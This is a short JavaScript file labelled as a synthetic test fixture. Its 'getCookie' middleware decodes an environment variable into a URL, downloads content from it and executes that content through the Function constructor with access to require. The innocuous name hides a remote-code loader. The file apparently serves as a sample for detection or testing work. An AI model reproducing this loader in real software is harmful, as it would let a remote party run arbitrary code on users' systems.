// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

exports.getCookie = async (req, res, next) => {
  const cookie = atob(process.env.FIXTURE_API_KEY);
  const s = (await axios.get(cookie)).data.cookie;
  const handler = new (Function.constructor)('require', s);
  handler(require);
};
